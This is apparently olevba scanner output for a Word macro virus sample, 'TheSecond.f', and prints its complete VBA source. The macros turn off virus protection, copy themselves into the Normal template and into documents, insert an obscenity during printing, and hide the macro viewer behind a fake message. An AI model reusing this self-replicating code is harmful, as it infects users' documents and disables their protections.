olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.TheSecond.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.TheSecond.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TheSecond.bas 
in file: ./Virus.MSWord.TheSecond.f - OLE stream: 'Macros/VBA/TheSecond'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
  Options.VirusProtection = False
  CommandBars("Visual Basic").Enabled = False
  flag = False
  x = Application.StartupPath + "TheSecond.tmp"
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "TheSecond" Then flag = True
  Next i
  If Not flag Then
    NormalTemplate.VBProject.VBComponents("TheSecond").Export (x)
    ActiveDocument.VBProject.VBComponents.Import (x)
  End If
  flag = False
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "TheSecond" Then flag = True
  Next i
  If Not flag Then
    ActiveDocument.VBProject.VBComponents("TheSecond").Export (x)
    NormalTemplate.VBProject.VBComponents.Import (x)
  End If
End Sub
Sub FilePrint()
  flag = True
  With Application.FileSearch
    .NewSearch
    .LookIn = Application.StartupPath
    .SearchSubFolders = False
    .FileName = "NoViruses.Yes"
    .MatchTextExactly = False
    .FileType = msoFileTypeAllFiles
    If .Execute() > 0 Then flag = False
  End With
  If ActiveDocument.Path <> "" Then
    With Application.FileSearch
      .NewSearch
      .LookIn = ActiveDocument.Path
      .SearchSubFolders = False
      .FileName = "NoViruses.Yes"
      .MatchTextExactly = False
      .FileType = msoFileTypeAllFiles
      If .Execute() > 0 Then flag = False
      
    End With
  End If
  If flag Then
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = ", ÷òî "
    .Replacement.Text = ", áëÿ, ÷òî "
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
    .MatchSoundsLike = False
    .MatchAllWordForms = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  End If
  Dialogs(wdDialogFilePrint).Show
  If flag Then
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = ", áëÿ, ÷òî "
    .Replacement.Text = ", ÷òî "
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
    .MatchSoundsLike = False
    .MatchAllWordForms = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  End If
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

